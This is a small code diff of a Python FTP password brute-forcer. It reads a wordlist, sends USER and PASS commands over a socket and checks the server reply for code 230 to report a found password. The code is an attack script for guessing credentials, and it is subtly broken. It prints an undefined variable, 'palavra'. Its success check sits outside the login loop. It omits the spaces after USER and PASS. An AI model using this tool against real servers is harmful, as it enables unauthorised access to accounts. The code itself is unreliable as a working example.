@@ -19,6 +19,10 @@ for word in f.readlines():
   s.send("USER" + user + "\r\n")  #\r\n works like ENTER key, to send the information
   s.recv(1024)
   s.send("PASS" + word + "\r\n")
-  resposta = s.recv(1024)
-  print(resposta)
+  answer = s.recv(1024)
   s.send("QUIT\r\n")
+
+if re.search("230", answer): #using re library, if there's 230 inside the var answer, it will do the IF
+  print("[+] Senha encontrada --->", palavra)
+else:
+  print("Acesso negado")
